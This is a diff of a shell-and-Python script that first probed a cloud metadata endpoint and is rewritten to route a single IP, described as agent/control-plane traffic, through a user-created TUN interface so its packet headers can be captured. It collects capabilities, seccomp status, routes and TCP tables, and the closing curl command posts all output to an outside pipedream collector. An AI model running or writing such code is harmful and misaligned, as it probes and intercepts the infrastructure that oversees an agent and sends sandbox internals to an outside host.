@@ -1,23 +1,25 @@
 #!/bin/sh
-# tun-route-capture.sh
+# tun-agent-header-capture.sh
 #
 # Usage:
-#   COLLECTOR_URL="https://your-collector.example/path" sh tun-route-capture.sh
+#   COLLECTOR_URL="https://your-collector.example/path" sh tun-agent-header-capture.sh
 #
 # Purpose:
-# - Push TUN route testing without ip/ifconfig/route.
-# - Add a host route to 169.254.169.254/32 via a TUN interface.
-# - Capture packets from the TUN fd while making a private-IP request.
-# - Clean up afterward.
+# - Briefly add a /32 route for 160.79.104.10 via TUN.
+# - Capture packet headers only to see whether agent/control-plane traffic
+#   can be diverted into user-controlled TUN.
+# - Clean up immediately.
 #
 # Safety:
-# - Single host route only.
-# - No metadata token paths.
-# - No broad scanning.
-# - Cleans up route/interface state by closing fd and deleting route.
+# - Header-only capture; no payload dump.
+# - Single destination IP.
+# - Short capture window.
+# - Route cleanup on exit.
 
 COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"
-POST_TIMEOUT="${POST_TIMEOUT:-30}"
+POST_TIMEOUT="${POST_TIMEOUT:-20}"
+CAPTURE_SECONDS="${CAPTURE_SECONDS:-6}"
+TARGET_IP="${TARGET_IP:-160.79.104.10}"
 
 (
 set -x
@@ -32,20 +34,46 @@ hostname -I 2>&1 || true
 cat /proc/cmdline 2>&1 || true
 cat /proc/net/dev 2>&1 || true
 cat /proc/net/route 2>&1 || true
-cat /proc/net/arp 2>&1 || true
+cat /proc/net/tcp 2>&1 || true
 ls -l /dev/net /dev/net/tun 2>&1 || true
 grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' /proc/self/status 2>&1 || true
 
 echo
 echo "=============================="
-echo "=== baseline private request ="
+echo "=== decoded TCP before ======="
 echo "=============================="
-timeout 3 curl -i -sS --connect-timeout 0.5 --max-time 2 \
-  "http://169.254.169.254/" 2>&1 | sed -n '1,25p'
+python3 - <<'PY' 2>&1 || true
+import socket, os
+
+target = os.environ.get("TARGET_IP", "160.79.104.10")
+states = {
+    "01": "ESTABLISHED",
+    "02": "SYN_SENT",
+    "03": "SYN_RECV",
+    "06": "TIME_WAIT",
+    "0A": "LISTEN",
+}
+
+def dec(x):
+    ip_hex, port_hex = x.split(":")
+    return socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1]), int(port_hex, 16)
+
+with open("/proc/net/tcp") as f:
+    next(f, None)
+    for line in f:
+        p = line.split()
+        if len(p) < 10:
+            continue
+        lip, lp = dec(p[1])
+        rip, rp = dec(p[2])
+        st = states.get(p[3], p[3])
+        if rip == target or lip == target or rp == 443 or lp == 443:
+            print(f"{st:12s} {lip}:{lp} -> {rip}:{rp} inode={p[9]}")
+PY
 
 echo
 echo "=============================="
-echo "=== TUN route capture ========"
+echo "=== TUN route header capture ="
 echo "=============================="
 python3 - <<'PY' 2>&1 || true
 import os
@@ -54,13 +82,14 @@ import struct
 import fcntl
 import time
 import threading
-import subprocess
 import errno
 import select
+import subprocess
 
-TARGET = "169.254.169.254"
-TUN_NAME = "auditTunR"
-TUN_IP = "10.123.45.1"
+TARGET = os.environ.get("TARGET_IP", "160.79.104.10")
+CAPTURE_SECONDS = float(os.environ.get("CAPTURE_SECONDS", "6"))
+TUN_NAME = "auditTunA"
+TUN_IP = "10.124.45.1"
 TUN_MASK = "255.255.255.252"
 
 # ioctl constants
@@ -166,45 +195,75 @@ def netlink_route(op, ifindex):
             raise OSError(-err, os.strerror(-err))
     return "NO_ACK_PARSED"
 
-def show_file(path, title):
+def show(path, title):
     print(f"--- {title}: {path}")
     try:
         print(open(path, "r", errors="replace").read())
     except Exception as e:
         print("READ_FAIL", type(e).__name__, e)
 
-def ipstr(b):
-    return socket.inet_ntoa(b)
+def decode_flags(flags):
+    names = []
+    for bit, name in [
+        (0x001, "FIN"),
+        (0x002, "SYN"),
+        (0x004, "RST"),
+        (0x008, "PSH"),
+        (0x010, "ACK"),
+        (0x020, "URG"),
+        (0x040, "ECE"),
+        (0x080, "CWR"),
+    ]:
+        if flags & bit:
+            names.append(name)
+    return ",".join(names) or "-"
 
-def decode_ipv4(pkt):
+def decode_ipv4_header(pkt):
     if len(pkt) < 20:
-        return "short-packet"
-    first = pkt[0]
-    version = first >> 4
-    ihl = (first & 0x0f) * 4
+        return {"summary": f"short len={len(pkt)}"}
+    vihl = pkt[0]
+    version = vihl >> 4
+    ihl = (vihl & 0x0f) * 4
     if version != 4 or len(pkt) < ihl:
-        return f"not-ipv4-or-short version={version} len={len(pkt)}"
-    proto = pkt[9]
-    src = ipstr(pkt[12:16])
-    dst = ipstr(pkt[16:20])
+        return {"summary": f"not-ipv4 version={version} len={len(pkt)}"}
     total = struct.unpack("!H", pkt[2:4])[0]
-    desc = f"IPv4 proto={proto} {src}->{dst} total={total} ihl={ihl}"
+    proto = pkt[9]
+    src = socket.inet_ntoa(pkt[12:16])
+    dst = socket.inet_ntoa(pkt[16:20])
+    info = {
+        "version": version,
+        "ihl": ihl,
+        "total": total,
+        "proto": proto,
+        "src": src,
+        "dst": dst,
+        "summary": f"IPv4 proto={proto} {src}->{dst} total={total}",
+    }
     if proto == 6 and len(pkt) >= ihl + 20:
-        sport, dport, seq, ack = struct.unpack("!HHII", pkt[ihl:ihl+12])
-        off_flags = struct.unpack("!H", pkt[ihl+12:ihl+14])[0]
+        tcp = pkt[ihl:ihl+20]
+        sport, dport, seq, ack, off_flags, win, csum, urg = struct.unpack("!HHIIHHHH", tcp)
         flags = off_flags & 0x01ff
-        desc += f" TCP {sport}->{dport} flags=0x{flags:03x}"
-    elif proto == 1 and len(pkt) >= ihl + 8:
-        typ, code = pkt[ihl], pkt[ihl+1]
-        desc += f" ICMP type={typ} code={code}"
-    return desc
+        data_offset = ((off_flags >> 12) & 0xf) * 4
+        info.update({
+            "sport": sport,
+            "dport": dport,
+            "seq": seq,
+            "ack": ack,
+            "tcp_flags_hex": f"0x{flags:03x}",
+            "tcp_flags": decode_flags(flags),
+            "tcp_data_offset": data_offset,
+            "payload_len": max(0, total - ihl - data_offset),
+            "summary": f"IPv4 TCP {src}:{sport}->{dst}:{dport} flags={decode_flags(flags)} total={total} payload_len={max(0, total - ihl - data_offset)}",
+        })
+    return info
 
 packets = []
 stop = False
 
 def reader(fd):
+    global stop
     os.set_blocking(fd, False)
-    deadline = time.time() + 6
+    deadline = time.time() + CAPTURE_SECONDS
     while time.time() < deadline and not stop:
         r, _, _ = select.select([fd], [], [], 0.25)
         if not r:
@@ -216,64 +275,53 @@ def reader(fd):
         except OSError as e:
             print("TUN_READ_FAIL", type(e).__name__, e)
             break
-        packets.append(pkt)
-        print("TUN_PACKET", len(pkt), decode_ipv4(pkt))
-        if len(packets) >= 20:
+        info = decode_ipv4_header(pkt)
+        packets.append(info)
+        print("TUN_HEADER", info.get("summary"))
+        if len(packets) >= 30:
             break
 
-def raw_http_request():
-    print("--- making raw socket request to target")
-    s = socket.socket()
-    s.settimeout(2)
+def tcp_table(label):
+    print(f"--- tcp table {label}")
+    states = {"01":"ESTABLISHED","02":"SYN_SENT","03":"SYN_RECV","06":"TIME_WAIT","0A":"LISTEN"}
+    def dec(x):
+        ip_hex, port_hex = x.split(":")
+        return socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1]), int(port_hex, 16)
     try:
-        s.connect((TARGET, 80))
-        print("CONNECT_OK")
-        s.sendall(
-            b"GET / HTTP/1.1\r\n"
-            b"Host: 169.254.169.254\r\n"
-            b"Metadata-Flavor: Google\r\n"
-            b"Connection: close\r\n\r\n"
-        )
-        out = b""
-        while len(out) < 2048:
-            try:
-                c = s.recv(2048 - len(out))
-            except socket.timeout:
-                break
-            if not c:
-                break
-            out += c
-        print("RESPONSE_BEGIN")
-        print(out.decode("utf-8", "replace"))
-        print("RESPONSE_END")
+        with open("/proc/net/tcp") as f:
+            next(f, None)
+            for line in f:
+                p = line.split()
+                if len(p) < 10:
+                    continue
+                lip, lp = dec(p[1])
+                rip, rp = dec(p[2])
+                if rip == TARGET or lip == TARGET or rp == 443 or lp == 443:
+                    print(f"{states.get(p[3], p[3]):12s} {lip}:{lp}->{rip}:{rp} inode={p[9]}")
     except Exception as e:
-        print("REQUEST_FAIL", type(e).__name__, e)
-    finally:
-        try:
-            s.close()
-        except Exception:
-            pass
+        print("TCP_READ_FAIL", type(e).__name__, e)
 
 fd = None
 route_added = False
 
 try:
-    print("--- create tun")
+    print("--- create TUN")
     fd = os.open("/dev/net/tun", os.O_RDWR)
     ifr = struct.pack("16sH", ifreq_name(TUN_NAME), IFF_TUN | IFF_NO_PI)
     res = fcntl.ioctl(fd, TUNSETIFF, ifr)
     actual = res[:16].rstrip(b"\0").decode()
     print("TUN_CREATED", actual, "fd", fd)
 
-    print("--- configure tun address/up")
+    print("--- configure TUN")
     set_ifaddr(actual, TUN_IP)
     set_ifnetmask(actual, TUN_MASK)
     set_ifup(actual)
     ifindex = socket.if_nametoindex(actual)
     print("IFINDEX", ifindex)
 
-    show_file("/proc/net/dev", "dev after tun up")
-    show_file("/proc/net/route", "route before add")
+    show("/proc/net/dev", "dev after TUN up")
+    show("/proc/net/route", "route before add")
+    tcp_table("before route")
 
     print("--- add route", TARGET + "/32", "dev", actual)
     try:
@@ -286,23 +334,29 @@ try:
         else:
             print("ROUTE_ADD_FAIL", type(e).__name__, e)
 
-    show_file("/proc/net/route", "route after add")
+    show("/proc/net/route", "route after add")
+    tcp_table("after route")
 
-    print("--- start tun reader and make request")
+    print("--- capture window begin")
     t = threading.Thread(target=reader, args=(fd,), daemon=True)
     t.start()
-    time.sleep(0.2)
-    raw_http_request()
-    time.sleep(2)
+
+    # Do not generate our own traffic. The goal is to see whether existing
+    # agent/control-plane traffic naturally hits the route during a short window.
+    time.sleep(CAPTURE_SECONDS)
+
     stop = True
     t.join(timeout=1)
 
-    print("--- packet summary")
+    print("--- capture summary")
+    print("TARGET", TARGET)
+    print("CAPTURE_SECONDS", CAPTURE_SECONDS)
     print("TUN_PACKET_COUNT", len(packets))
-    for i, pkt in enumerate(packets[:10]):
-        print(f"PKT{i}", decode_ipv4(pkt))
+    for i, info in enumerate(packets[:30]):
+        print("PKT", i, info)
 
-    show_file("/proc/net/dev", "dev after request")
+    show("/proc/net/dev", "dev after capture")
+    tcp_table("after capture")
 
 finally:
     print("--- cleanup")
@@ -318,42 +372,44 @@ finally:
             print("TUN_FD_CLOSED")
         except Exception as e:
             print("TUN_CLOSE_FAIL", type(e).__name__, e)
-    show_file("/proc/net/route", "route final")
-    show_file("/proc/net/dev", "dev final")
+    show("/proc/net/route", "route final")
+    show("/proc/net/dev", "dev final")
 PY
 
 echo
 echo "=============================="
-echo "=== optional TAP visibility =="
+echo "=== decoded TCP after ========"
 echo "=============================="
 python3 - <<'PY' 2>&1 || true
-import os, fcntl, struct, time
+import socket, os
 
-TUNSETIFF = 0x400454ca
-IFF_TAP   = 0x0002
-IFF_NO_PI = 0x1000
+target = os.environ.get("TARGET_IP", "160.79.104.10")
+states = {"01":"ESTABLISHED","02":"SYN_SENT","03":"SYN_RECV","06":"TIME_WAIT","0A":"LISTEN"}
 
-try:
-    fd = os.open("/dev/net/tun", os.O_RDWR)
-    ifr = struct.pack("16sH", b"auditTapX", IFF_TAP | IFF_NO_PI)
-    res = fcntl.ioctl(fd, TUNSETIFF, ifr)
-    print("TAP_CREATED", res[:16].rstrip(b"\0").decode(), "fd", fd)
-    print(open("/proc/net/dev").read())
-    time.sleep(1)
-    os.close(fd)
-    print("TAP_CLOSED")
-    print(open("/proc/net/dev").read())
-except Exception as e:
-    print("TAP_FAIL", type(e).__name__, e)
+def dec(x):
+    ip_hex, port_hex = x.split(":")
+    return socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1]), int(port_hex, 16)
+
+with open("/proc/net/tcp") as f:
+    next(f, None)
+    for line in f:
+        p = line.split()
+        if len(p) < 10:
+            continue
+        lip, lp = dec(p[1])
+        rip, rp = dec(p[2])
+        st = states.get(p[3], p[3])
+        if rip == target or lip == target or rp == 443 or lp == 443:
+            print(f"{st:12s} {lip}:{lp} -> {rip}:{rp} inode={p[9]}")
 PY
 
 echo
 echo "=============================="
 echo "=== interpretation ==========="
 echo "=============================="
-echo "If TUN_PACKET_COUNT > 0 and request fails/hangs: route diversion works."
-echo "If TUN_PACKET_COUNT == 0 and request returns private_dest_ip: filter/interceptor bypasses normal routing."
-echo "If TUN_PACKET_COUNT > 0 and request still returns private_dest_ip: very interesting split-path behavior."
-echo "If metadata content appears, stop before credential/token endpoints."
+echo "If TUN_PACKET_COUNT > 0: user-controlled root can divert agent/control-plane packets for that destination into TUN."
+echo "If only headers were printed, this is header-level evidence, not payload capture."
+echo "If TUN_PACKET_COUNT == 0: no natural traffic to that destination occurred during the short capture window, or connections were already established and did not route new packets during the window."
+echo "If session/network breaks briefly, cleanup should restore route."
 
 ) 2>&1 | curl -s -m "$POST_TIMEOUT" -X POST --data-binary @- "$COLLECTOR_URL"
